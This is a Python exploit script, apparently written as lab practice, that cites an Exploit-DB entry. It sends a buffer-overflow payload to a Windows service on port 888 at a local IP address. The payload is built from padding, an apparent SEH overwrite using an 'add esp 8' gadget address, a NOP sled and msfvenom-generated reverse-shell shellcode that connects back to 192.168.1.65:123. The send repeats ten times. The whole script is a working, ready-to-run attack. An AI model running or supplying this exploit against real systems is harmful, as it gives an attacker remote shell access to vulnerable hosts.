#!/usr/bin/env python3

# Tyler Boykin
# Speed Run: ~8 hours
# Exploit DB entry:	https://www.exploit-db.com/exploits/19625


from os import system
from struct import pack
from time import sleep
import socket

def p(x):
    return pack('<I',x)

RHOST='192.168.1.66'
RPORT=888

OFFSET = 1076
TAIL = 2820

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.65 LPORT=123 -b '\x00' -f python
buf =  ""
buf += "\xbe\xbc\xae\xde\x97\xdb\xca\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x52\x31\x72\x12\x83\xea\xfc\x03\xce\xa0\x3c"
buf += "\x62\xd2\x55\x42\x8d\x2a\xa6\x23\x07\xcf\x97\x63\x73"
buf += "\x84\x88\x53\xf7\xc8\x24\x1f\x55\xf8\xbf\x6d\x72\x0f"
buf += "\x77\xdb\xa4\x3e\x88\x70\x94\x21\x0a\x8b\xc9\x81\x33"
buf += "\x44\x1c\xc0\x74\xb9\xed\x90\x2d\xb5\x40\x04\x59\x83"
buf += "\x58\xaf\x11\x05\xd9\x4c\xe1\x24\xc8\xc3\x79\x7f\xca"
buf += "\xe2\xae\x0b\x43\xfc\xb3\x36\x1d\x77\x07\xcc\x9c\x51"
buf += "\x59\x2d\x32\x9c\x55\xdc\x4a\xd9\x52\x3f\x39\x13\xa1"
buf += "\xc2\x3a\xe0\xdb\x18\xce\xf2\x7c\xea\x68\xde\x7d\x3f"
buf += "\xee\x95\x72\xf4\x64\xf1\x96\x0b\xa8\x8a\xa3\x80\x4f"
buf += "\x5c\x22\xd2\x6b\x78\x6e\x80\x12\xd9\xca\x67\x2a\x39"
buf += "\xb5\xd8\x8e\x32\x58\x0c\xa3\x19\x35\xe1\x8e\xa1\xc5"
buf += "\x6d\x98\xd2\xf7\x32\x32\x7c\xb4\xbb\x9c\x7b\xbb\x91"
buf += "\x59\x13\x42\x1a\x9a\x3a\x81\x4e\xca\x54\x20\xef\x81"
buf += "\xa4\xcd\x3a\x05\xf4\x61\x95\xe6\xa4\xc1\x45\x8f\xae"
buf += "\xcd\xba\xaf\xd1\x07\xd3\x5a\x28\xc0\x1c\x32\x33\x51"
buf += "\xf5\x41\x33\x51\x7e\xcf\xd5\x3b\x90\x99\x4e\xd4\x09"
buf += "\x80\x04\x45\xd5\x1e\x61\x45\x5d\xad\x96\x08\x96\xd8"
buf += "\x84\xfd\x56\x97\xf6\xa8\x69\x0d\x9e\x37\xfb\xca\x5e"
buf += "\x31\xe0\x44\x09\x16\xd6\x9c\xdf\x8a\x41\x37\xfd\x56"
buf += "\x17\x70\x45\x8d\xe4\x7f\x44\x40\x50\xa4\x56\x9c\x59"
buf += "\xe0\x02\x70\x0c\xbe\xfc\x36\xe6\x70\x56\xe1\x55\xdb"
buf += "\x3e\x74\x96\xdc\x38\x79\xf3\xaa\xa4\xc8\xaa\xea\xdb"
buf += "\xe5\x3a\xfb\xa4\x1b\xdb\x04\x7f\x98\xeb\x4e\xdd\x89"
buf += "\x63\x17\xb4\x8b\xe9\xa8\x63\xcf\x17\x2b\x81\xb0\xe3"
buf += "\x33\xe0\xb5\xa8\xf3\x19\xc4\xa1\x91\x1d\x7b\xc1\xb3"

add_esp_8 = p(0x6604F027).decode("latin1")

for i in range(0,10):

    request = ""
    request += 'A' * (OFFSET - 4)
    request += 'HHw\x04'
    request += add_esp_8
    request += '\x90\x90\x90\x90'
    request += buf
    request += 'B' * (TAIL - 4 - len(buf))

    print(f"[*] Trying a fuzz len of {len(request)} | round {i} ")
    sockfd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sockfd.connect((RHOST,RPORT))
    sockfd.send(request.encode("latin1"))
    sockfd.close()
    sleep(0.1)
